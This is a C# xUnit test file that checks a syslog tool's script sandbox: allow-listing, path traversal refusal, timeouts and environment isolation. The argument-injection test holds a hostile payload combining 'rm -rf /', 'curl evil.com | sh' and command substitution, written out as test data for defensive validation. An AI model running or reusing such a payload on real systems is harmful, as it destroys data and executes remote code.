using FluentAssertions;
using VSoftSol.Syslog.Core.Rules;
using VSoftSol.Syslog.IntegrationTests.TestSupport;
using VSoftSol.Syslog.Rules.Actions;
using Xunit;

namespace VSoftSol.Syslog.IntegrationTests.Rules;

/// <summary>
/// PHASE_07 Security Validation — RunScript sandbox. Command injection is structurally
/// impossible (argument vector, no shell); an executable outside the allow-list, a
/// relative / <c>..</c> path, or a symlink escape is refused and the parent environment is
/// not inherited.
/// </summary>
public sealed class ScriptSandboxTests
{
    private static readonly ActionExecutorRegistry Registry = new();

    /// <summary>Copies the built probe into a fresh allow-listed directory.</summary>
    private static (string ExePath, ActionExecutorOptions Options) Sandbox()
    {
        string dir = Path.Combine(Path.GetTempPath(), "vsoftsol-scripts-" + Guid.NewGuid().ToString("N"));
        Directory.CreateDirectory(dir);
        string src = ActionTestSupport.ProbeExecutable();
        string dst = Path.Combine(dir, Path.GetFileName(src));
        File.Copy(src, dst);
        // the probe is framework-dependent — copy its runtimeconfig + deps too
        foreach (string ext in new[] { ".runtimeconfig.json", ".deps.json", ".dll", ".pdb" })
        {
            string companion = Path.ChangeExtension(src, ext);
            if (File.Exists(companion))
            {
                File.Copy(companion, Path.Combine(dir, Path.GetFileName(companion)), overwrite: true);
            }
        }

        return (dst, new ActionExecutorOptions { ScriptAllowListDirectories = [dir] });
    }

    [Fact]
    public async Task Script_ExitZero_IsSuccess()
    {
        (string exe, ActionExecutorOptions options) = Sandbox();
        var action = new RunScriptAction { ExecutablePath = exe, Arguments = ["--exit=0", "{hostname}"] };

        ActionResult result = await Registry.ExecuteAsync(
            ActionTestSupport.Context(action, options: options), CancellationToken.None);

        result.Ok.Should().BeTrue(because: result.Detail);
        result.Detail.Should().Contain("core-sw-1", "the argument was substituted and echoed");
    }

    [Fact]
    public async Task Script_NonZeroExit_IsPermanentFailure_WithOutputCaptured()
    {
        (string exe, ActionExecutorOptions options) = Sandbox();
        var action = new RunScriptAction { ExecutablePath = exe, Arguments = ["--exit=7"] };

        ActionResult result = await Registry.ExecuteAsync(
            ActionTestSupport.Context(action, options: options), CancellationToken.None);

        result.Ok.Should().BeFalse();
        result.Retryable.Should().BeFalse();
        result.Detail.Should().Contain("7");
    }

    [Fact]
    public async Task Script_ExceedingItsTimeout_IsKilled_AndReportedTransient()
    {
        (string exe, ActionExecutorOptions options) = Sandbox();
        var action = new RunScriptAction { ExecutablePath = exe, Arguments = ["--sleep=30"], TimeoutSeconds = 1 };

        var sw = System.Diagnostics.Stopwatch.StartNew();
        ActionResult result = await Registry.ExecuteAsync(
            ActionTestSupport.Context(action, options: options), CancellationToken.None);
        sw.Stop();

        result.Ok.Should().BeFalse();
        result.Retryable.Should().BeTrue();
        sw.Elapsed.Should().BeLessThan(TimeSpan.FromSeconds(15));
    }

    [Fact]
    public async Task Script_OutsideTheAllowList_IsRefused()
    {
        (_, ActionExecutorOptions options) = Sandbox();
        string outside = OperatingSystem.IsWindows()
            ? Path.Combine(Environment.SystemDirectory, "cmd.exe")
            : "/bin/sh";
        var action = new RunScriptAction { ExecutablePath = outside };

        ActionResult result = await Registry.ExecuteAsync(
            ActionTestSupport.Context(action, options: options), CancellationToken.None);

        result.Ok.Should().BeFalse();
        result.Detail.Should().Contain("allow-listed");
    }

    [Theory]
    [InlineData("action-probe.exe")]                              // relative
    [InlineData("../action-probe.exe")]                           // traversal
    public async Task Script_RelativeOrTraversalPath_IsRefused(string path)
    {
        (string exe, ActionExecutorOptions options) = Sandbox();
        string candidate = path.Contains("..", StringComparison.Ordinal)
            ? Path.Combine(Path.GetDirectoryName(exe)!, path)
            : path;
        var action = new RunScriptAction { ExecutablePath = candidate };

        ActionResult result = await Registry.ExecuteAsync(
            ActionTestSupport.Context(action, options: options), CancellationToken.None);

        result.Ok.Should().BeFalse();
    }

    [Fact]
    public async Task Script_ArgumentInjection_IsPassedAsOneLiteralToken_NotInterpreted()
    {
        (string exe, ActionExecutorOptions options) = Sandbox();
        const string payload = "; rm -rf / && curl evil.com | sh $(whoami) `id` %USERPROFILE%";
        var action = new RunScriptAction { ExecutablePath = exe, Arguments = ["--exit=0", payload] };

        ActionResult result = await Registry.ExecuteAsync(
            ActionTestSupport.Context(action, options: options), CancellationToken.None);

        result.Ok.Should().BeTrue();
        // The probe echoes each argument on its own line; the payload must appear verbatim.
        result.Detail.Should().Contain("; rm -rf / && curl evil.com");
    }

    [Fact]
    public async Task Script_DoesNotInheritTheParentEnvironment()
    {
        (string exe, ActionExecutorOptions options) = Sandbox();
        Environment.SetEnvironmentVariable("VSOFTSOL_SECRET_LEAK_CANARY", "super-secret-value");
        try
        {
            var action = new RunScriptAction { ExecutablePath = exe, Arguments = ["--exit=0"] };
            ActionResult result = await Registry.ExecuteAsync(
                ActionTestSupport.Context(action, options: options), CancellationToken.None);

            result.Ok.Should().BeTrue();
            result.Detail.Should().NotContain("super-secret-value");
            result.Detail.Should().Contain("SYSLOG_RULE: test rule", "only the minimal environment is passed");
        }
        finally
        {
            Environment.SetEnvironmentVariable("VSOFTSOL_SECRET_LEAK_CANARY", null);
        }
    }
}
